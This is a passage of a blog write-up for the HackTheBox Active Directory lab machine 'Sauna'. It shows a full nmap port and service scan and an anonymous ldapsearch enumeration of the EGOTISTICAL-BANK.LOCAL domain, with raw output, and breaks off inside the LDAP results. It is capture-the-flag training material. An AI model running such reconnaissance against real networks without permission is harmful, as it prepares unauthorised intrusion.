<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Sauna" /><meta property="og:locale" content="en" /><meta name="description" content="Port Scan Results ‚§µÔ∏è" /><meta property="og:description" content="Port Scan Results ‚§µÔ∏è" /><link rel="canonical" href="https://strongshiv8.github.io/posts/Sauna/" /><meta property="og:url" content="https://strongshiv8.github.io/posts/Sauna/" /><meta property="og:site_name" content="StrongShiv8" /><meta property="og:image" content="https://strongshiv8.github.io/Vulnhub-Files/img/Sauna/Untitled.jpeg" /><meta property="og:image:alt" content="Active Directory Easy level Machine üìÇ ..." /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-01-25T00:00:00+05:30" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://strongshiv8.github.io/Vulnhub-Files/img/Sauna/Untitled.jpeg" /><meta name="twitter:image:alt" content="Active Directory Easy level Machine üìÇ ..." /><meta property="twitter:title" content="Sauna" /><meta name="twitter:site" content="@StrongShiv8" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-09-10T22:25:35+05:30","datePublished":"2024-01-25T00:00:00+05:30","description":"Port Scan Results ‚§µÔ∏è","headline":"Sauna","image":{"alt":"Active Directory Easy level Machine üìÇ ...","url":"https://strongshiv8.github.io/Vulnhub-Files/img/Sauna/Untitled.jpeg","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://strongshiv8.github.io/posts/Sauna/"},"url":"https://strongshiv8.github.io/posts/Sauna/"}</script><title>Sauna | StrongShiv8</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="StrongShiv8"><meta name="application-name" content="StrongShiv8"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js?baseurl=&register=true" ></script> <script src="/assets/js/progress.js" defer></script> <script src="/assets/js/auto-update.js" defer></script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/images/avatar/avatar.jpeg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/">StrongShiv8</a><p class="site-subtitle fst-italic mb-0">OSCP | eJPTv2 | Cyber Security Fanatic</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/StrongShiv8" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/StrongShiv8" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-x-twitter"></i> </a> <a href="https://app.hackthebox.com/users/595651" aria-label="hackthebox" target="_blank" rel="noopener noreferrer" > <i class="fa-solid fa-cube"></i> </a> <a href="https://www.linkedin.com/in/shivendra-prajapati-a788401a5/" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Sauna</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>Sauna</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1706121000" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Jan 25, 2024 </time> </span> <span> Updated <time data-ts="1725987335" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Sep 10, 2024 </time> </span><div class="mt-3 mb-3"> <a href="/Vulnhub-Files/img/Sauna/Untitled.jpeg" class="popup img-link preview-img shimmer"><img src="/Vulnhub-Files/img/Sauna/Untitled.jpeg" alt="Active Directory Easy level Machine üìÇ ..." width="1200" height="630" loading="lazy"></a><figcaption class="text-center pt-2 pb-2">Active Directory Easy level Machine üìÇ ...</figcaption></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/StrongShiv8">Shivendra Prajapati</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="2251 words" > <em>12 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">Sauna</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">Sauna</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><h2 id="port-scan-results-Ô∏è"><span class="me-2">Port Scan Results ‚§µÔ∏è</span><a href="#port-scan-results-Ô∏è" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/Downloads/HTB/Sauna]
‚îî‚îÄ<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> <span class="nt">-T4</span> <span class="nt">-oN</span> Nmap_Result.txt 10.10.10.175 <span class="nt">-Pn</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-01-20 12:04 IST
Nmap scan report <span class="k">for </span>10.10.10.175
Host is up <span class="o">(</span>0.092s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65515 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-01-20 13:39:42Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49745/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   <span class="nb">date</span>: 2024-01-20T13:40:34
|_  start_date: N/A
|_clock-skew: 7h00m01s
</pre></table></code></div></div><h2 id="ldap-enumeration-Ô∏è"><span class="me-2">LDAP Enumeration ‚§µÔ∏è</span><a href="#ldap-enumeration-Ô∏è" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>When comes to active directory I check LDAP default informations first through ldapsearch Tool like this :</p><div class="language-powershell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
</pre><td class="rouge-code"><pre><span class="err">‚îå‚îÄ‚îÄ</span><span class="p">(</span><span class="n">kali</span><span class="err">„âø</span><span class="nx">kali</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">~/Downloads/HTB/Sauna</span><span class="p">]</span><span class="w">
</span><span class="err">‚îî‚îÄ$</span><span class="w"> </span><span class="n">ldapsearch</span><span class="w"> </span><span class="nt">-x</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="n">ldap</span><span class="p">:</span><span class="n">//10.10.10.175</span><span class="w"> </span><span class="nt">-b</span><span class="w"> </span><span class="s1">'DC=EGOTISTICAL-BANK,DC=local'</span><span class="w">
</span><span class="c"># extended LDIF</span><span class="w">
</span><span class="c">#</span><span class="w">
</span><span class="c"># LDAPv3</span><span class="w">
</span><span class="c"># base &lt;DC=EGOTISTICAL-BANK,DC=local&gt; with scope subtree</span><span class="w">
</span><span class="c"># filter: (objectclass=*)</span><span class="w">
</span><span class="c"># requesting: ALL</span><span class="w">
</span><span class="c">#</span><span class="w">

</span><span class="c"># EGOTISTICAL-BANK.LOCAL</span><span class="w">
</span><span class="n">dn</span><span class="p">:</span><span class="w"> </span><span class="n">DC</span><span class="o">=</span><span class="n">EGOTISTICAL</span><span class="nt">-BANK</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="n">objectClass</span><span class="p">:</span><span class="w"> </span><span class="n">top</span><span class="w">
</span><span class="n">objectClass</span><span class="p">:</span><span class="w"> </span><span class="n">domain</span><span class="w">
</span><span class="n">objectClass</span><span class="p">:</span><span class="w"> </span><span class="n">domainDNS</span><span class="w">
</span><span class="n">distinguishedName</span><span class="p">:</span><span class="w"> </span><span class="n">DC</span><span class="o">=</span><span class="n">EGOTISTICAL</span><span class="nt">-BANK</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="n">instanceType</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="w">
</span><span class="n">whenCreated</span><span class="p">:</span><span class="w"> </span><span class="mf">20200123054425.0</span><span class="n">Z</span><span class="w">
</span><span class="nx">whenChanged:</span><span class="w"> </span><span class="nx">20240120132536.0Z</span><span class="w">
</span><span class="n">subRefs</span><span class="p">:</span><span class="w"> </span><span class="n">DC</span><span class="o">=</span><span class="n">ForestDnsZones</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">EGOTISTICAL</span><span class="nt">-BANK</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="n">subRefs</span><span class="p">:</span><span class="w"> </span><span class="n">DC</span><span class="o">=</span><span class="n">DomainDnsZones</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">EGOTISTICAL</span><span class="nt">-BANK</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="n">subRefs</span><span class="p">:</span><span class="w"> </span><span class="n">CN</span><span class="o">=</span><span class="n">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">EGOTISTICAL</span><span class="nt">-BANK</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="n">uSNCreated</span><span class="p">:</span><span class="w"> </span><span class="mi">4099</span><span class="w">
</span><span class="n">dSASignature</span><span class="p">::</span><span class="w"> </span><span class="n">AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A</span><span class="o">==</span><span class="w">
</span><span class="n">uSNChanged</span><span class="p">:</span><span class="w"> </span><span class="mi">98336</span><span class="w">
</span><span class="n">name</span><span class="p">:</span><span class="w"> </span><span class="n">EGOTISTICAL</span><span class="nt">-BANK</span><span class="w">
</span><span class="n">objectGUID</span><span class="p">::</span><span class="w"> </span><span class="mi">7</span><span class="n">AZOUMEioUOTwM9IB/gzYw</span><span class="o">==</span><span class="w">
</span><span class="n">replUpToDateVector</span><span class="p">::</span><span class="w"> </span><span class="n">AgAAAAAAAAAGAAAAAAAAAEbG/1RIhXVKvwnC1AVq4o8WgAEAAAAAAM9av</span><span class="w">
 </span><span class="nx">BsDAAAAq4zveNFJhUSywu2cZf6vrQzgAAAAAAAAKDj</span><span class="o">+</span><span class="nx">FgMAAADc0VSB8WEuQrRECkAJ5oR1FXABAA</span><span class="w">
 </span><span class="n">AAAADUbg8XAwAAAP1ahZJG3l5BqlZuakAj9gwL0AAAAAAAANDwChUDAAAAm/DFn2wdfEWLFfovGj4</span><span class="w">
 </span><span class="nx">TThRgAQAAAAAAENUAFwMAAABAvuCzxiXsRLK5n/hcRLLsCbAAAAAAAADUBFIUAwAAAA</span><span class="o">==</span><span class="w">
</span><span class="n">creationTime</span><span class="p">:</span><span class="w"> </span><span class="mi">133502307364825316</span><span class="w">
</span><span class="n">forceLogoff</span><span class="p">:</span><span class="w"> </span><span class="nt">-9223372036854775808</span><span class="w">
</span><span class="n">lockoutDuration</span><span class="p">:</span><span class="w"> </span><span class="nt">-18000000000</span><span class="w">
</span><span class="n">lockOutObservationWindow</span><span class="p">:</span><span class="w"> </span><span class="nt">-18000000000</span><span class="w">
</span><span class="n">lockoutThreshold</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w">
</span><span class="n">maxPwdAge</span><span class="p">:</span><span class="w"> </span><span class="nt">-36288000000000</span><span class="w">
</span><span class="n">minPwdAge</span><span class="p">:</span><span class="w"> </span><span class="nt">-864000000000</span><span class="w">
</span><span class="n">minPwdLength</span><span class="p">:</span><span class="w"> </span><span class="mi">7</span><span class="w">
</span><span class="n">modifiedCountAtLastProm</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w">
</span><span class="n">nextRid</span><span class="p">:</span><span class="w"> </span><span class="mi">1000</span><span class="w">
</span><span class="n">pwdProperties</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
</span><span class="n">pwdHistoryLength</span><span class="p">:</span><span class="w"> </span><span class="mi">24</span><span class="w">
</span><span class="n">objectSid</span><span class="p">::</span><span class="w"> </span><span class="n">AQQAAAAAAAUVAAAA</span><span class="o">+</span><span class="n">o7VsIowlbg</span><span class="o">+</span><span class="n">rLZG</span><span class="w">
</span><span class="n">serverState</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
</span><span class="n">uASCompat</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
</span><span class="n">modifiedCount</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
</span><span class="n">auditingPolicy</span><span class="p">::</span><span class="w"> </span><span class="n">AAE</span><span class="o">=</span><span class="w">
</span><span class="n">nTMixedDomain</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w">
</span><span class="n">rIDManagerReference</span><span class="p">:</span><span class="w"> </span><span class="n">CN</span><span class="o">=</span><span class="n">RID</span><span class="w"> </span><span class="n">Manager</span><span class="err">$</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">System</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">EGOTISTICAL</span><span class="nt">-BANK</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="n">fSMORoleOwner</span><span class="p">:</span><span class="w"> </span><span class="n">CN</span><span class="o">=</span><span class="n">NTDS</span><span class="w"> </span><span class="n">Settings</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">SAUNA</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Servers</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Default</span><span class="nt">-First-Site-Name</span><span class="w">
 </span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Sites</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">EGOTISTICAL</span><span class="nt">-BANK</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="n">systemFlags</span><span class="p">:</span><span class="w"> </span><span class="nt">-1946157056</span><span class="w">
</span><span class="n">wellKnownObjects</span><span class="p">:</span><span class="w"> </span><span class="n">B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN</span><span class="o">=</span><span class="n">NTDS</span><span class="w"> </span><span class="n">Quotas</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">EGOT</span><span class="w">
 </span><span class="n">ISTICAL</span><span class="nt">-BANK</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="n">wellKnownObjects</span><span class="p">:</span><span class="w"> </span><span class="n">B:32:F4BE92A4C777485E878E9421D53087DB:CN</span><span class="o">=</span><span class="n">Microsoft</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Progra</span><span class="w">
 </span><span class="n">m</span><span class="w"> </span><span class="nx">Data</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">EGOTISTICAL</span><span class="nt">-BANK</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="n">wellKnownObjects</span><span class="p">:</span><span class="w"> </span><span class="n">B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN</span><span class="o">=</span><span class="n">Program</span><span class="w"> </span><span class="n">Data</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">EGO</span><span class="w">
 </span><span class="n">TISTICAL</span><span class="nt">-BANK</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="n">wellKnownObjects</span><span class="p">:</span><span class="w"> </span><span class="n">B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN</span><span class="o">=</span><span class="n">ForeignSecurityPrin</span><span class="w">
 </span><span class="n">cipals</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">EGOTISTICAL</span><span class="nt">-BANK</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="n">wellKnownObjects</span><span class="p">:</span><span class="w"> </span><span class="n">B:32:18E2EA80684F11D2B9AA00C04F79F805:CN</span><span class="o">=</span><span class="n">Deleted</span><span class="w"> </span><span class="n">Objects</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="w">
 </span><span class="n">EGOTISTICAL</span><span class="nt">-BANK</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="n">wellKnownObjects</span><span class="p">:</span><span class="w"> </span><span class="n">B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN</span><span class="o">=</span><span class="n">Infrastructure</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">E</span><span class="w">
 </span><span class="nx">GOTISTICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="n">wellKnownObjects</span><span class="p">:</span><span class="w"> </span><span class="n">B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN</span><span class="o">=</span><span class="n">LostAndFound</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">EGO</span><span class="w">
 </span><span class="n">TISTICAL</span><span class="nt">-BANK</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="n">wellKnownObjects</span><span class="p">:</span><span class="w"> </span><span class="n">B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN</span><span class="o">=</span><span class="n">System</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">EGOTISTIC</span><span class="w">
 </span><span class="n">AL</span><span class="nt">-BANK</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="n">wellKnownObjects</span><span class="p">:</span><span class="w"> </span><span class="n">B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU</span><span class="o">=</span><span class="n">Domain</span><span class="w"> </span><span class="n">Controllers</span><span class="p">,</span><span class="w">
 </span><span class="n">DC</span><span class="o">=</span><span class="n">EGOTISTICAL</span><span class="nt">-BANK</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="n">wellKnownObjects</span><span class="p">:</span><span class="w"> </span><span class="n">B:32:AA312825768811D1ADED00C04FD8D5CD:CN</span><span class="o">=</span><span class="n">Computers</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">EGOTIS</span><span class="w">
 </span><span class="n">TICAL</span><span class="nt">-BANK</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="n">wellKnownObjects</span><span class="p">:</span><span class="w"> </span><span class="n">B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">EGOTISTICA</span><span class="w">
 </span><span class="n">L-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="n">objectCategory</span><span class="p">:</span><span class="w"> </span><span class="n">CN</span><span class="o">=</span><span class="n">Domain</span><span class="nt">-DNS</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Schema</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">EGOTISTICAL</span><span class="nt">-BANK</span><span class="p">,</span><span class="n">D</span><span class="w">
 </span><span class="nx">C</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="n">isCriticalSystemObject</span><span class="p">:</span><span class="w"> </span><span class="n">TRUE</span><span class="w">
</span><span class="n">gPLink</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="n">LDAP</span><span class="p">:</span><span class="n">//CN</span><span class="o">=</span><span class="p">{</span><span class="mi">31</span><span class="n">B2F340-016D-11D2-945F-00C04FB984F9</span><span class="p">},</span><span class="n">CN</span><span class="o">=</span><span class="n">Policies</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">Syste</span><span class="w">
 </span><span class="nx">m</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">EGOTISTICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="p">;</span><span class="mi">0</span><span class="err">]</span><span class="w">
</span><span class="n">dSCorePropagationData:</span><span class="w"> </span><span class="nx">16010101000000.0Z</span><span class="w">
</span><span class="n">otherWellKnownObjects:</span><span class="w"> </span><span class="nx">B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN</span><span class="o">=</span><span class="n">Keys</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">EGOTIS</span><span class="w">
 </span><span class="nx">TICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
</span><span class="nx">otherWellKnownObjects:</span><span class="w"> </span><span class="nx">B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN</span><span class="o">=</span><span class="n">Managed</span><span class="w"> </span><span class="nx">Servic</span><span class="w">
 </span><span class="n">e</span><span class="w"> </span><span class="nx">Accounts</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">EGOTISTICAL-BANK</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">
